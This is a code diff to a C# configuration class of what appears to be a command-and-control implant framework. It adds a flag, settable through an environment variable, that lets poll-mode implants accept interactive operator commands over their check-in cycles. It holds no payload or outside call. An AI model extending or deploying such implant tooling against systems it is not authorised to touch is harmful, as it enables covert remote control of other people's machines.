@@ -91,6 +91,16 @@ internal sealed class Config
     public string Mode { get; set; } = BeaconModes.Stream;
 
     /// <summary>
+    /// The degraded-channel opt-in (architecture.md Sec 10.3): a poll-mode
+    /// implant that carries it advertises the store-and-forward capability
+    /// ("channels.poll") and accepts the interactive verbs over its check-in
+    /// cycles -- operator input arrives with the next check-in, at the
+    /// cycle's latency, the deliberate tradeoff the bake names. Baked at
+    /// build time; flag/env override.
+    /// </summary>
+    public bool DegradedChannels { get; set; }
+
+    /// <summary>
     /// The verb set baked in at build time (the profile's "verbs" key,
     /// architecture.md Sec 5.2/5.3): the class's reduced set plus the
     /// contract-only verbs no class gates, so an out-of-tree handler compiled in
@@ -180,6 +190,7 @@ internal sealed class Config
                 Headers = ParseHeadersEnv(Env("ROD_HEADERS", string.Empty)),
             },
             Mode = NormalizeMode(Env("ROD_MODE", BeaconModes.Stream)),
+            DegradedChannels = EnvFlag("ROD_DEGRADED_CHANNELS"),
             ClassVerbs = ParseCommaList(Env("ROD_VERBS", string.Empty)),
             Quiet = EnvFlag("ROD_QUIET"),
         };
